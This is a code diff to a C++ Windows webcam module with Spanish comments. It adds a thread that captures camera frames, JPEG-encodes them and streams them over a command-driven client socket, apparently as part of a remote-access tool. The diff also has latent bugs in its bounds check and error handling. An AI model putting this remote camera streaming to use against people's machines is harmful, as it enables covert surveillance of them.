@@ -1,5 +1,8 @@
+#include "cliente.hpp"
 #include "mod_camara.hpp"
 #include "misc.hpp"
+
+extern Cliente* cCliente;
 
 //Conversion functions
 int mod_Camera::GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
@@ -187,8 +190,8 @@ HRESULT mod_Camera::ListCaptureDevices(std::vector<IMFActivate*>& devices)
     return hr;
 }
 
-std::vector<char*> mod_Camera::ListNameCaptureDevices() {
-    std::vector<char*> vcDevices;
+std::vector<std::string> mod_Camera::ListNameCaptureDevices() {
+    std::vector<std::string> vcDevices;
     IMFAttributes* pAttributes = NULL;
     HRESULT hr = MFCreateAttributes(&pAttributes, 1);
     if (SUCCEEDED(hr)){
@@ -211,12 +214,13 @@ std::vector<char*> mod_Camera::ListNameCaptureDevices() {
 
                         size_t iRet;
                         wcstombs_s(&iRet, cBuffer, sizeof(cBuffer), szFriendlyName, sizeof(cBuffer) - 1);
-                        vcDevices.push_back(cBuffer);
+                        vcDevices.push_back(std::string(cBuffer));
                     }
 
                     //Agregar el dev a la lista interna tambien
                     this->vcCams.push_back(ppDevices[i]);
                     this->vcActivated.push_back(false);
+                    this->vcIsLive.push_back(false);
 
                     //Agregar el source y reader por defecto                    
                     IMFSourceReader* dummyReader = nullptr;
@@ -361,7 +365,7 @@ HRESULT mod_Camera::OpenMediaSource(IMFMediaSource*& pSource, int pIndexDev){
 }
 
 HRESULT mod_Camera::Init(IMFActivate*& pDevice, int pIndexDev) {
-    if (this->vc_pSource.size() < pIndexDev) {
+    if (int(this->vc_pSource.size()) < pIndexDev) {
         //Ya esta inicializado
         if (this->vc_pSource[pIndexDev] && this->vc_pReader[pIndexDev]) {
             return S_OK;
@@ -392,7 +396,6 @@ BYTE* mod_Camera::GetFrame(int& iBytesOut, int pIndexDev) {
     LONGLONG llTimeStamp;
     IMFSample* pSample = NULL;
     HRESULT hr;
-    int iCount = 0;
     //Hay que hacer un loop hasta que tome el frame
     while (1) {
         hr = this->vc_pReader[pIndexDev]->ReadSample(
@@ -417,10 +420,7 @@ BYTE* mod_Camera::GetFrame(int& iBytesOut, int pIndexDev) {
         }
 
         //We got a sample
-        //Agarrar el 3 frame
-        //if (iCount++ == 3) {
-            break;
-        //}
+        break;
     }
 
     if (SUCCEEDED(hr) && pSample != NULL){
@@ -461,4 +461,67 @@ BYTE* mod_Camera::GetFrame(int& iBytesOut, int pIndexDev) {
     }
 
     return cBufferOut;
+}
+
+void mod_Camera::SpawnLive(int pIndexDev) {
+    this->thLive = std::thread(&mod_Camera::LiveCam, this, pIndexDev);
+}
+
+void mod_Camera::JoinLiveThread(int pIndexDev) {
+    this->vcIsLive[pIndexDev] = false;
+    if (this->thLive.joinable()) {
+        this->thLive.join();
+    }
+}
+
+void mod_Camera::LiveCam(int pIndexDev) {
+    HRESULT hr;
+    if (!this->vcActivated[pIndexDev]) {
+        hr = this->Init(this->vcCams[pIndexDev], pIndexDev);
+    }
+
+
+    if (SUCCEEDED(hr)) {
+        this->vcActivated[pIndexDev] = true;
+        this->vcIsLive[pIndexDev] = true;
+
+        DebugPrint("[!]Live iniciado");
+
+        std::string strHeader = std::to_string(EnumComandos::CM_Single_Salida);
+        strHeader.append(1, CMD_DEL);
+        int iHeaderSize = strHeader.size();
+
+        while (this->vcIsLive[pIndexDev]) {
+            int iBufferSize = 0;
+            u_int iJPGBufferSize = 0;
+            u_int uiPacketSize = 0;
+            BYTE* cBuffer = this->GetFrame(iBufferSize, pIndexDev);
+            BYTE* cJPGBuffer = nullptr;
+            BYTE* cPacket = nullptr;
+
+            if (cBuffer) {
+                cJPGBuffer = this->toJPEG(cBuffer, iBufferSize, iJPGBufferSize);
+                if (cJPGBuffer) {
+                    uiPacketSize = iHeaderSize + iJPGBufferSize;
+                    cPacket = new BYTE[uiPacketSize];
+                    if (cPacket) {
+                        memcpy(cPacket, strHeader.c_str(), iHeaderSize);
+                        memcpy(cPacket + iHeaderSize, cJPGBuffer, iJPGBufferSize);
+                        
+                        cCliente->cSend(cCliente->sckSocket, (const char*)cPacket, uiPacketSize, 0, true);
+                        
+                        delete[] cPacket;
+                        cPacket = nullptr;
+                    }
+                    delete[] cJPGBuffer;
+                    cJPGBuffer = nullptr;
+                }
+            }
+
+            if (cBuffer) {
+                delete[] cBuffer;
+                cBuffer = nullptr;
+            }
+        }
+    }
 }
